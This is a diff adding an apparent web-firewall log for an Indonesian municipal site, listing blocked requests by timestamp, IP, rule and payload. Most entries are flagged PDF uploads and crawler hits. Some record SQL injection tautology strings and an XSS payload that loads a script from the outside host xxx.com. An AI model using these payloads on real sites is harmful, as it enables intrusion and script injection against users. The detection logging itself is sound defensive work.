@@ -1,0 +1,12 @@
+1519367760@@@185.100.86.154@@@GET@@@SQL injection@@@3@@@30@@@post@@@dokumens\'or\'1\'=\'1@@@https://simponie.tangerangselatankota.go.id:443/index.php
+1519367883@@@185.100.86.154@@@GET@@@SQL injection@@@3@@@30@@@id@@@1\'or\'1\'=\'1@@@https://simponie.tangerangselatankota.go.id:443/index.php
+1519369987@@@125.161.129.177@@@FILE@@@Script Upload@@@3@@@0@@@@@@TDP BSD.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519370155@@@125.161.129.177@@@FILE@@@Script Upload@@@3@@@0@@@@@@Surat Pernyataan Reklame + Materai.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519370627@@@65.19.167.131@@@GET@@@XSS case HTML tag@@@2@@@75@@@x@@@\<Script src=//xxx.com\>\</script\>@@@https://simponie.tangerangselatankota.go.id:443/index.php
+1519370855@@@125.161.129.177@@@FILE@@@Script Upload@@@3@@@0@@@@@@TDP BSD.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519370874@@@125.161.129.177@@@FILE@@@Script Upload@@@3@@@0@@@@@@SIUP BSD.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519371085@@@125.161.129.177@@@FILE@@@Script Upload@@@3@@@0@@@@@@Surat Pernyataan Reklame + Materai.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519380571@@@103.47.135.165@@@FILE@@@Script Upload@@@3@@@0@@@@@@KTP & Ijazah.pdf@@@https://simponie.tangerangselatankota.go.id:443/fm/upload.php
+1519389271@@@54.36.148.70@@@HTTP_USER_AGENT@@@Suspicious bots/scanners@@@1@@@81@@@-@@@Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)@@@https://simponie.tangerangselatankota.go.id:443/index.php
+1519393617@@@54.36.149.82@@@HTTP_USER_AGENT@@@Suspicious bots/scanners@@@1@@@81@@@-@@@Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)@@@https://simponie.tangerangselatankota.go.id:443/index.php
+1519396445@@@54.36.149.87@@@HTTP_USER_AGENT@@@Suspicious bots/scanners@@@1@@@81@@@-@@@Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)@@@https://simponie.tangerangselatankota.go.id:443/index.php
